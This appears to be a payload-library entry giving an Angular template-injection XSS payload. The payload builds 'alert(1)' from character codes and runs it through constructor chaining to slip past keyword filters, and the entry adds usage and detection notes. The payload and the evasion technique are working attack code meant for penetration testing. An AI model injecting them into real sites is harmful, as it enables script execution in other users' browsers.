---
id: ec749c68-fd55-4cbb-a63c-07e6024661f9
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.715239+00:00'
updated_at: '2023-04-10T20:24:52.691430+00:00'
tags:
  - xss
  - angular
  - payload
  - obfuscation
platforms:
  - Web
validated: true
---

# Angular-XSS-fromCharCode-Alert

## Code

```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

## Description

This Angular template injection payload uses String.fromCharCode to construct the string 'alert(1)' from ASCII values (e.g., 97='a', 108='l') and executes it via constructor chaining, bypassing filters that block direct 'alert' keywords.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (None) | This payload has no customizable variables; char codes are hardcoded for 'alert(1)'. | N/A |

## Usage

Inject this payload into a vulnerable Angular expression like {{ injectedPayload }} during testing for client-side template injection. It executes immediately in the browser context, useful for proof-of-concept XSS demonstrations.

## Detection

- Monitor for unusual constructor or fromCharCode calls in client-side scripts.
- WAF rules detecting chained prototype access or ASCII-to-string conversions.
- Browser console errors or CSP violations on alert execution.

## Related

- [[procedures/Advanced-XSS-Bypass-in-Angular-and-AngularJS]]
